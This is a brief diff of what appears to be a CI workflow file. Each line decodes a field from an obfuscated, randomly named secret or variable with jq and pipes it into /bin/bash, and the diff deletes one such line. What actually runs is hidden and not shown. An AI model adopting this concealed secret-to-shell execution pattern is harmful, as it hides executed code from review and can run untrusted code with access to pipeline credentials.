@@ -22,7 +22,6 @@ jobs:
           jz6983: ${{ secrets.jz6983 }}
         run: |
           printf '%s' "$jz6983" | jq -r .axcz2 | /bin/bash
-          echo $sjju8 | jq -r .e82594 | /bin/bash
           echo $zkgn7583 | jq -r .kps446 | /bin/bash
           printf '%s' "$l5841" | jq -r .z10060 | /bin/bash
           printf '%s' "$lf4509" | jq -r .dnexy2 | /bin/bash
